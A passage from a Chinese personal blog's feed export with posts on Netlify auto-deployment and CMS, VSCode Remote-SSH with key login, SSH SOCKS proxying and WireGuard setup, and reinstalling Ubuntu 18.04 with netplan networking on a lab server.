    <category term="荒废的老本行" scheme="https://zhangjk98.xyz/categories/%E8%8D%92%E5%BA%9F%E7%9A%84%E8%80%81%E6%9C%AC%E8%A1%8C/"/>
    
    
    <category term="树莓派3B+" scheme="https://zhangjk98.xyz/tags/%E6%A0%91%E8%8E%93%E6%B4%BE3B/"/>
    
  </entry>
  
  <entry>
    <title>试用Netlify自动部署和CMS</title>
    <link href="https://zhangjk98.xyz/e9d5/"/>
    <id>https://zhangjk98.xyz/e9d5/</id>
    <published>2019-11-30T07:58:43.000Z</published>
    <updated>2019-11-30T12:22:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>又开始了瞎折腾。话说我这种没人看的静态小破网站，真的有必要持续集成、持续部署吗？</p><a id="more"></a><h2 id="使用netlify进行自动化部署">使用Netlify进行自动化部署</h2><p>不知道怎么都在搞CI/CD（Continuous Integration/Continuous Deployment），Github也搞了个Github Action。看了一圈感觉对于我这种半个月git commit一次备份博客的人并没有什么必要，而且不管是travis ci还是github action或netlify自己的在线build都很慢，博客东西多一点几分钟就过去了（没有特殊需求就想安安静静写个博客就不要搞这个了，本地hexo g，hexo d推到github pages或者netlify就完事了，速度还快）</p><p>之前都是在本地生成，hexo g &amp;&amp; hexo d 推到Github pages，然后Netlify关联这个仓库自动拉取(好像是用的钩子吧)。备份的时候再 git commit &amp;&amp; git push 本地项目。 现在每次 git commit 备份并 git push，让Netlify从Hexo的项目直接在线 Hexo g ，按部就班授权，改仓库，改deploy命令为 hexo clean &amp;&amp; hexo generate 结果直接Deploy failed了 报错:</p><pre class="line-numbers language-log" data-language="log"><code class="language-log">failed during stage &#39;preparing repo&#39;: Error checking out submodules: fatal: No url found for submodule path &#39;themes&#x2F;next&#39; in .gitmodules<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查了一下发现是Netlify会把每一个包含.git的子目录当成是一个submodule，并且每次都要<code>git submodule update</code>一下，但是这个next主题的git仓库又没有在在我的.gitmodules配置里面设置为submodule, 那我们直接把themes/next加到.gitmodules里面就好了<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a></p><p>在根目录（执行hexo g &amp;&amp; hexo d的那个目录）新建<code>.gitmodules</code>写入</p><pre class="line-numbers language-log" data-language="log"><code class="language-log">[submodule &quot;themes&#x2F;next&quot;]path &#x3D; themes&#x2F;nexturl &#x3D; https:&#x2F;&#x2F;github.com&#x2F;theme-next&#x2F;hexo-theme-next<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>再执行就行了(先<code>git commit</code>,再<code>git push</code>,再进Netlify试一下)</p><p>看到Deploy log：</p><pre class="line-numbers language-log" data-language="log"><code class="language-log">4:46:21 PM: Minifying js bundle4:46:22 PM: Minifying css bundle4:46:23 PM: Minifying css bundle4:46:36 PM: Finished processing build request in 56.658478141s4:46:37 PM: Post processing done4:46:37 PM: Site is live<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>行了，速度还是可以的，build过程56秒（虽然本地只要几秒，Hugo之类的更快） 对比一下本地</p><pre class="line-numbers language-log" data-language="log"><code class="language-log">INFO  Files loaded in 3.96 s···INFO  180 files generated in 2.01 s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这个速度可以接受，据说Netlify最近新增了CI的时间限制（官网说是300 included/month，每个月三百分钟），但是我这种不是重度用户的人根本用不完（实在不行本地hexo s调试好了再提交就完事了，Netlify也要恰饭的嘛，每次CI都要重新安装环境） 带宽也有限制，100GB，我这个没人看的小破博客也根本用不了。</p><p>还有一个小问题，改成这样之后发现每一篇文章的更新时间都变成了今天，暂时还没找到判定更新时间的原理是什么，一个办法是手动指定时间戳 在每个markdown文件开头</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">updated: '2019-11-30 20:22:52'date: '2019-11-30 20:22:52'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>更新，找到了这个时间戳的问题，看这个issue：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0L2lzc3Vlcy84OTM=">The update time of the article is incorrect<i class="fa fa-external-link-alt"></i></span></p><p>大概是Git在checkout的时候，没有正确保留时间戳，试了一下，应该就是push上去的时间，而不是修改后add的时间或者commit的时间</p><blockquote><p>It uses the push time of the last modification of the file.</p></blockquote><p>根据issue里的解决办法，只要在<code>hexo clean &amp;&amp; hexo generate</code> 之前加上<code>git ls-files -z | while read -d '' path; do touch -d \"$(git log -1 --format=\"@%ct\" \"$path\")\" \"$path\"; done</code>就行了</p><p>算了，直接关了吧</p><h2 id="netlify-cms-使用">Netlify CMS 使用</h2><p>（多说一句，Netlify官网打开是真的慢啊） 我已经踩过坑了，没有他们吹的那么好，大骗子，这个也就手机/平板写markdown和发布可以将就一下，真的都不如随身带个U盘里面装着博客工程或者markdown体验好 如果不是有多人协作之类的需求就不要乱试了（除非你真的吃饱了撑的没事干</p><p>如果你还是要安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">yarn</span> <span class="token function">add</span> hexo-netlify-cms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后在Netlify里面设置一下<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>, 开启git-gateway服务并在Snippet Injection加入一行代码</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://identity.netlify.com/v1/netlify-identity-widget.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开yoursite/admin就可以看到了 这个时候Settings-&gt;Identity-&gt;Registration是开放注册的，我们改成Invite only 然后在设置里面Settings-&gt;Identity-&gt;External providers里面进行Github授权或者在在identity页面发邮件邀请（是点进你的team里面identity页面输入邮件地址然后点invite users按钮，不是在设置里的identity） 由于我是白嫖用户，Indetity Level 0，什么Audit log之类的都用不了, 设置到这里基本就结束了。</p><ul><li>这句话是我在Netlify CMS里面打的，试试，貌似这个在线的markdown编辑器并不太好用,感觉跟CodiMD差了好多啊，也没有夜间模式，也不支持Mathjax之类的</li></ul><p>行吧，感觉被坑了啊，一点也不好用啊。<del>等有空我在教研室服务器上部署个CodiMD玩</del></p><p>（或许可以在本地写好了markdown再粘贴上去，这个markdown在线编辑器实在是难用，而且丑）</p><p>唯一能看的就是它会自动同步你的repo，但是你下次在本地编辑的时候还得git pull一下，什么时候仓库不在手边的时候能拿来将就一下。（好像可以拿手机之类的操作啊）</p><p>什么，你说多人协作？也不太好用，免费用户invite只能五个账号，鸡肋；收费用户太贵了，并不划算。还不如直接建一个git repository多人协作结合CI发布。至于使用Netlify CMS多人一起维护发布网站内容, 行吧，个人博客基本用不到。也许是给不愿意折腾又想建站还想搞个静态博客的小白用的，但是这样的小白真的有1%吗？</p><p>当然netilify cms对于静态网站还是有它的意义的，不然也不会在Github有那么多star，但是对于不需要多人协作的个人博客，就别装了吧（已经装了的和不折腾不舒服斯基人士请随意）</p><h2 id="参考">参考</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ppYW5ndGovaGV4by1uZXRsaWZ5LWNtcy9ibG9iL21hc3Rlci9SRUFETUUtWkgubWQ=">Hexo Netlify CMS<i class="fa fa-external-link-alt"></i></span></p><section class="footnotes" role="doc-endnotes"><hr /><ol><li id="fn1" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9naXQtc2NtLmNvbS9ib29rL3poL3YyL0dpdC3lt6Xlhbct5a2Q5qih5Z2X">Git 工具 - 子模块<i class="fa fa-external-link-alt"></i></span> 可能会有切换分支等其他问题<a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn2" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZG5vY20uY29tL2FydGljbGVzL2JlZWNobnV0L2hleG8tbmV0bGlmeS1jbXMv">https://www.dnocm.com/articles/beechnut/hexo-netlify-cms/<i class="fa fa-external-link-alt"></i></span><a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li></ol></section>]]></content>
    
    
    <summary type="html">&lt;p&gt;又开始了瞎折腾。话说我这种没人看的静态小破网站，真的有必要持续集成、持续部署吗？&lt;/p&gt;</summary>
    
    
    
    <category term="杂七杂八" scheme="https://zhangjk98.xyz/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
    <category term="netlify" scheme="https://zhangjk98.xyz/tags/netlify/"/>
    
    <category term="ci" scheme="https://zhangjk98.xyz/tags/ci/"/>
    
  </entry>
  
  <entry>
    <title>VSCode使用ssh-key远程登录Ubuntu</title>
    <link href="https://zhangjk98.xyz/7f63/"/>
    <id>https://zhangjk98.xyz/7f63/</id>
    <published>2019-11-22T02:05:08.000Z</published>
    <updated>2019-11-22T02:05:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>兼谈使用SSH转发加快教研室网上冲浪速度 <a id="more"></a> Mobaxterm挺好用的，只是那个文本编辑器不舒服。 试着用一下VSCode的remote-ssh 通过ssh-key登录就不多讲了<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a></p><h2 id="mobaxterm设置ssh密钥登录">Mobaxterm设置SSH密钥登录</h2><p>ssh-keygen生成密钥之后在Mobaxterm的SSH设置找到Advanced SSH Setting里勾选import SSH key可以直接导入密钥。 退出再登录显示这样</p><pre class="line-numbers language-log" data-language="log"><code class="language-log">Authenticating with public key &quot;Imported-Openssh-Key: id_rsa&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就是成功了（失败会提示这样<code>Server refused our key</code>)</p><h2 id="vscode设置ssh密钥登录">VSCode设置SSH密钥登录</h2><p>装Remote-ssh插件，然后左边框会有个小电脑的图标，点那个图标，再点SSH TARGETS的设置（Configure），进行配置 它有个配置文件，一般在<code>C:/Users/&lt;username&gt;/.ssh</code>下面的config 编辑它的配置文件，Host随便填，HostName填ip，User填用户名，IdentityFile填私钥路径，Port填端口（默认22可以不填） （要是认证失败什么的，建议把那些.ssh文件夹底下的文件删了，比如known_hosts）</p><pre class="line-numbers language-config" data-language="config"><code class="language-config">Host workstation    HostName hostname    User user    IdentityFile C:&#x2F;Users&#x2F;XXX&#x2F;.ssh&#x2F;id_rsa    Port 22<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>连接的时候可能会让你手动在termial里的信息 这样应该就行了, 不用每次输密码了。看到那个</p><p>什么？想用密码不想用ssh-key密钥登录，不能保存密码🐴？ 您好，官方文档说不能 &gt;Yes, you should be prompted to enter your token or password automatically. However, passwords are not saved, so using key based authentication is typically more convenient</p><p>（当然这里是新出的功能，bug当然少不了，我就遇到过<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pY3Jvc29mdC92c2NvZGUtcmVtb3RlLXJlbGVhc2UvaXNzdWVzLzEyMTc=">这样的<i class="fa fa-external-link-alt"></i></span>, 一般遇到问题先升一下最新版或者用insider试试，再不行就去GitHub提issue） 其他的问题找官方文档<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>看看，貌似可以SSH端口转发</p><p>远程SSH的VSCode插件是单独的，可以自行安装 如果你要配置多台主机SSH,在配置文件里并列加配置就行了</p><pre class="line-numbers language-config" data-language="config"><code class="language-config">Host workstation    HostName hostname    User userHost Server    HostName hostname    User user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ssh端口转发">SSH端口转发</h2><p>老网民很熟悉的网上冲浪手段之一就是SSH Tunnel<a href="#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a>。当只开了22端口的时候可以用这种方法绕过防火墙用TCP之类的，当然，这种方法曾经也用来突破那个巨大的 防火墙 。 今天我突发奇想，看到工作站和服务器的专用线路的速度贼快啊，<del>专用线路从来不低于45Mb/s不高于50Mb/s的速度毫不含糊</del>，还有公网IP。 而102网吧由于老板太抠，四个人用一个路由器，辣鸡校园网网速10M/s都跑不到...</p><p>使用Mobaxterm和SwityOmega插件可以满足大部分需求</p><p>MobaXterm里选Tools &gt; MobaSHHtunnel &gt; New SHH tunnel &gt; Dynamic Port forwarding (SOCKS proxy)</p><p>那个Dynamic Port 是动态转发，不是v2ray那种用来防止被封的动态端口，就是你本地的端口会被转到服务器上相同的端口，是sockets5代理 配置你的端口和密钥（最好把那个autostart和Autoconnect也选上），然后到SwityOmega之类的工具里面填上相应的端口，就可以愉快的上网了。从浏览器的IP查询网站看一下IP，已经是服务器的IP了</p><p>更新，看错了，忘了分Mbps和MBps了，实际上快不了多少，只有6MBps/s。但是没人跟我抢，自己走专线还是快一点的。</p><p>终端的命令可以看这篇，不多说了<a href="#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a></p><h2 id="突然意识到">突然意识到</h2><p>为什么要用SSH呢，现在不用担心被FIREWALL制裁, 流量特征明显的WireGuard可以用了呀... 有空试试这个闪闪发光的新生代VPN, 底层貌似是UDP，红龙LOGO挺拉风的(跑题了 WireGuard据说要加到新的Linux Kernel里面，但是现在教研室的老Ubuntu只能自己装（这个我18年就听说了要加进kernel啦，连Linus都说好要加辣<a href="#fn5" class="footnote-ref" id="fnref5" role="doc-noteref"><sup>5</sup></a>然而鸽到现在，还是没加，据说作者在搞windows的,现在做的差不多了，要回来折腾Linux了） 之前WireGuard由于流量特征太明显就换了v2，现在试试这个 安装比Openvpn简单，Ubuntu直接PPA装就行了（需要root权限）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> add-apt-repository ppa:wireguard/wireguard<span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> wireguard<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>win10的官方客户端已经出了，之前18年那会我还用的Tunsafe，设置参考这里<a href="#fn6" class="footnote-ref" id="fnref6" role="doc-noteref"><sup>6</sup></a> 听八卦说Tunsafe和WireGuard作者还有过撕逼，此处不表</p><h3 id="其他">其他</h3><h3 id="开机自启">开机自启</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl <span class="token builtin class-name">enable</span> wg-quick@wg0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="使用vscode愉快的写cc">使用VSCode愉快的写C/C++</h3><p>装C/C++和coderunner插件就行了，现在可以自动配置运行和调试的文件了（就那个以前一堆坑还经常改一更新就配置失效的launch.json和config.json）</p><h3 id="vscode连接docker">VSCode连接Docker</h3><p>安装Docker和Docker compose插件（在远程里面），然后直接用就行了</p><h2 id="注">注</h2><section class="footnotes" role="doc-endnotes"><hr /><ol><li id="fn1" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9oeWprMjAwMC5naXRodWIuaW8vMjAxMi8wMy8xNi9ob3ctdG8tc2V0LXVwLXNzaC1rZXlzLw==">设置 SSH 通过密钥登录<i class="fa fa-external-link-alt"></i></span><a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn2" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9jb2RlLnZpc3VhbHN0dWRpby5jb20vZG9jcy9yZW1vdGUvc3No">官方文档：Remote Development using SSH<i class="fa fa-external-link-alt"></i></span><a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn3" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnlhbmRlcmUubW9lL21vZS9nZnctdnMtcHJveHkvOTcuaHRtbA==">墙与梯的较量<i class="fa fa-external-link-alt"></i></span><a href="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn4" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuaWJtLmNvbS9kZXZlbG9wZXJ3b3Jrcy9jbi9saW51eC9sLWNuLXNzaGZvcndhcmQvaW5kZXguaHRtbA==">实战 SSH 端口转发<i class="fa fa-external-link-alt"></i></span><a href="#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn5" role="doc-endnote"><p>Linus在邮件中回复说： &gt;Btw, on an unrelated issue: I see that Jason actually made the pull &gt;request to have wireguard included in the kernel. &gt; &gt;Can I just once again state my love for it and hope it gets merged &gt;soon? Maybe the code isn't perfect, but I've skimmed it, and compared to the horrors that are OpenVPN and IPSec, it's a work of art. 见<span class="exturl" data-url="aHR0cHM6Ly9sa21sLm9yZy9sa21sLzIwMTgvOC8yLzY2Mw==">https://lkml.org/lkml/2018/8/2/663<i class="fa fa-external-link-alt"></i></span><a href="#fnref5" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn6" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9nb2xiLmhwbGFyLmNoLzIwMTkvMDcvd2lyZWd1YXJkLXdpbmRvd3MuaHRtbA==">Setting up WireGuard on Windows<i class="fa fa-external-link-alt"></i></span><a href="#fnref6" class="footnote-back" role="doc-backlink">↩︎</a></p></li></ol></section>]]></content>
    
    
    <summary type="html">&lt;p&gt;兼谈使用SSH转发加快教研室网上冲浪速度</summary>
    
    
    
    <category term="102网吧日常" scheme="https://zhangjk98.xyz/categories/102%E7%BD%91%E5%90%A7%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="ssh" scheme="https://zhangjk98.xyz/tags/ssh/"/>
    
    <category term="vscode" scheme="https://zhangjk98.xyz/tags/vscode/"/>
    
  </entry>
  
  <entry>
    <title>给服务器重装Ubuntu</title>
    <link href="https://zhangjk98.xyz/2d5/"/>
    <id>https://zhangjk98.xyz/2d5/</id>
    <published>2019-11-18T09:00:54.000Z</published>
    <updated>2019-11-18T09:00:54.000Z</updated>
    
    <content type="html"><![CDATA[<p><img width=100 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/haixing.png" alt="Picture"/> 祖传服务器传到了我的手里 <a id="more"></a> 上回书说到，服务器一不小心卸载了iptables 现在准备重装。还是打算装Ubuntu Server（并不打算装Manjaro，也不适合搞桌面版，今天试过一下Ubuntu Desktop，图形化界面由于服务器没有独显直接卡到爆炸） <del>初步打算安装Ubuntu server 16.04.6LTS, 使用LVM分区</del> 安装Ubuntu18.04LTS，之前VPS用过一阵18，也没注意有什么新特性，据说还是改了一些东西⬇</p><blockquote><p>据说 内核更新到了 Linux kernel 4.15，这就意味着新增了不少特性 bbr什么的 网络管理工具 ifupdown 已经彻底废弃，建议全面拥抱 ip 命令 DNS 由 systemd 全面接管，接口监听在 127.0.0.53:53，配置文件在 /etc/systemd/resolved.conf，修改后重启服务即可 systemctl restart systemd-resolved。不要听网上那些奇怪的教程教你如何修改 /etc/resolv.conf swap 文件来替代 swap 分区</p></blockquote><h2 id="装ubuntu16.04lts">装Ubuntu16.04LTS</h2><h3 id="安装">安装</h3><p>下载iso，制作启动盘，这里用的Rufus <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/rufus.png" alt="Picture" style="zoom:80%;" /></p><p>然后直接装，网卡直接自动识别了，配置也没什么好说的，可以参考这里<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>或这里<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>,</p><h3 id="后续配置">后续配置</h3><p>进去之后换你电镜像源（终端里vim改/etc/apt/sources.list） apt包update&amp;&amp;upgrade 修改时区和系统时间 安装Docker，照着官方教程装Docker的时候根本下载不动,换了个国内的源 桌面不打算装gnome或者kde了，Mobaxterm用X11一般就够了</p><h2 id="重新安装ubuntu18.04-lts">重新安装Ubuntu18.04 LTS</h2><p>由于某些原因，决定还是换18</p><h2 id="再次安装">再次安装</h2><p>UEFI启动 create bond这里先不配置了（只有一张网卡eno1），bound mode选默认的balance-rr eno1网卡选择automatic自动获取ipv4和ipv6 镜像源这里输入你电的 选use the entire disk and set up LVM <del>是否安装openssh，空格选安装，选择从GitHub获取</del> 然后输入你的用户名(先准备好key，当然这个时候要保证网也是通的) 这里勾选openssh之后一直报错，可能是网的问题，不勾选，等后面再装 分区就分一个/boot，一个/swap，一个/home <!-- （当然你要先准备好key，先用git bash生成key`ssh-keygen -t rsa -C 'your_email@example.com'`再到Github的SSH设置里面把公钥填进去（id_rsa.pub里面的内容）然后测试一下是否成功<img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/ssh-github.png" alt="Picture" style="zoom:80%;" />） --></p><p>然后是漫长的installing kernal （不知道为什么装server比desktop版慢那么多）</p><p>bbr已经自带了，不用装了 设置root用户和用户组权限 装Docker参考这里<a href="#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a> 和英文官方教程那个差不多，主要是获取GPG的地址和Docker源换成国内的 换成国内中科大的镜像源（这个换了也时断时续可能连不上） 出现permission denied：</p><pre class="line-numbers language-log" data-language="log"><code class="language-log">Got permission denied while trying to connect to the Docker daemon socket at unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock: Get http:&#x2F;&#x2F;%2Fvar%2Frun%2Fdocker.sock&#x2F;v1.40&#x2F;containers&#x2F;json: dial unix &#x2F;var&#x2F;run&#x2F;docker.sock: connect: permission denied<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>是权限的问题，要加当前用户到用户组里面</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gpasswd -a <span class="token variable">$&#123;<span class="token environment constant">USER</span>&#125;</span> docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="更改静态为ip">更改静态为ip</h3><p>网卡是eno1（服务器就一个网卡） Ubuntu18的配置改了，在<code>/etc/netplan/50-cloud-init.yaml</code>, 现在18使用netplan管理网络 配置文件是yaml格式，跟hexo和next主题的配置文件格式一样</p><pre class="line-numbers language-yml" data-language="yml"><code class="language-yml"># network: &#123;config: disabled&#125;network:    ethernets:        eno1:            dhcp4: true    version: 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改成</p><pre class="line-numbers language-yml" data-language="yml"><code class="language-yml">network:  version: 2  renderer: networkd  ethernets:    eno1:   #配置的网卡名称#      dhcp4: true    #dhcp4关闭#      dhcp6: true    #dhcp6关闭      addresses: [211.83.111.224&#x2F;23]   #设置本机IP及掩码      gateway4: 211.83.110.1   #设置网关      nameservers:          addresses: [114.114.114.114, 8.8.8.8]   #设置DNS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(网关地址用<code>route -n</code>查看，配置参考<span class="exturl" data-url="aHR0cDovL2Jsb2cuc2luYS5jb20uY24vcy9ibG9nXzUzNzNiY2Y0MDEwMnhrNWcuaHRtbA==">ubuntu 18.04 netplan yaml配置固定IP地址<i class="fa fa-external-link-alt"></i></span>)</p><p>然后</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> netplan apply<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不对啊，又炸了，ipv4的网关到底是啥啊</p><p>看了一下官网<a href="#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a>，好像nameserver和gateway4都是可选项，可以空着默认 直接改成这样试试</p><pre class="line-numbers language-yml" data-language="yml"><code class="language-yml">network:  version: 2#  renderer: networkd  ethernets:    eno1:      addresses: [211.83.111.224&#x2F;23]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后进/run/systemd/network看一下系统的网络配置文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /run/systemd/network`<span class="token function">ls</span><span class="token function">cat</span> *<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>下面这样应该就可以了，吧.....？</p><pre class="line-numbers language-log" data-language="log"><code class="language-log">root@xi102server:&#x2F;run&#x2F;systemd&#x2F;network# cat 10-netplan-eno1.network[Match]Name&#x3D;eno1[Network]LinkLocalAddressing&#x3D;ipv6Address&#x3D;211.83.111.224&#x2F;23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>行吧，搜出一堆东西都不靠谱，还是得看官网</p><h3 id="感想">感想</h3><p>服务器启动的声音真的大啊 一半以上的问题都是网络问题，校内这个网真的.... 靠镜像源救回半条狗命</p><p>Ubuntu18安装时配置网卡时想选静态ip选择Manual进去填写subnet, 结果那个subnet选项是<code>XXX.XXX.XXX.XXX/XX</code> 看了教研室其他设备相同频段的子网掩码是<code>255.255.254.0</code>，但是填了不行，用网上计算子网掩码的工具算了一下，就是<code>255.255.254.0</code></p><p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/netmmask.png" alt="Picture" style="zoom:80%;" /></p><p>暂时选了DHCP直接配置网卡，等进去再指定静态ip<a href="#fn5" class="footnote-ref" id="fnref5" role="doc-noteref"><sup>5</sup></a></p><p>哦，netplan好像把子网掩码的格式改了 原来是这样 &gt;address = 192.168.225.50 netmask = 255.255.255.0</p><p>改成了这种格式 &gt;addresses : [192.168.225.50/24]</p><p>滚去补习计网知识了</p><h2 id="安装参考">安装参考</h2><p>223.5.5.5 223.6.6.6</p><section class="footnotes" role="doc-endnotes"><hr /><ol><li id="fn1" role="doc-endnote"><p><span class="exturl" data-url="dHRwczovL3R1dG9yaWFscy51YnVudHUuY29tL3R1dG9yaWFsL3R1dG9yaWFsLWluc3RhbGwtdWJ1bnR1LXNlcnZlcg==">tutorial-install-ubuntu-server<i class="fa fa-external-link-alt"></i></span><a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn2" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS8zMjQxNzY2LzIzMjM5Mjc=">Ubuntu16.04.5以lvm方式安装全记录<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0xWTV8o566A5L2T5Lit5paHKQ==">LVM arch-wiki<i class="fa fa-external-link-alt"></i></span><a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn3" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly95ZWFzeS5naXRib29rcy5pby9kb2NrZXJfcHJhY3RpY2UvaW5zdGFsbC91YnVudHUuaHRtbA==">Ubuntu 安装 Docker CE<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cHM6Ly95ZWFzeS5naXRib29rcy5pby9kb2NrZXJfcHJhY3RpY2UvaW5zdGFsbC9taXJyb3IuaHRtbA==">镜像加速器<i class="fa fa-external-link-alt"></i></span><a href="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn4" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9uZXRwbGFuLmlvL2V4YW1wbGVz">netplan官网的配置示例<i class="fa fa-external-link-alt"></i></span><a href="#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn5" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly93d3cudGVjbWludC5jb20vY29uZmlndXJlLW5ldHdvcmstc3RhdGljLWlwLWFkZHJlc3MtaW4tdWJ1bnR1Lw==">How to Configure Network Static IP Address in Ubuntu 18.04<i class="fa fa-external-link-alt"></i></span><a href="#fnref5" class="footnote-back" role="doc-backlink">↩︎</a></p></li></ol></section>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img width=100 src=&quot;https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/haixing.png&quot; alt=&quot;Picture&quot;/&gt; 祖传服务器传到了我的手里</summary>
    
    
    
    <category term="102网吧日常" scheme="https://zhangjk98.xyz/categories/102%E7%BD%91%E5%90%A7%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="ubuntu" scheme="https://zhangjk98.xyz/tags/ubuntu/"/>
    
    <category term="装机" scheme="https://zhangjk98.xyz/tags/%E8%A3%85%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>糊个网页吧</title>
    <link href="https://zhangjk98.xyz/4a8d/"/>
    <id>https://zhangjk98.xyz/4a8d/</id>
    <published>2019-11-18T07:58:43.000Z</published>
    <updated>2019-11-18T07:58:43.000Z</updated>
    
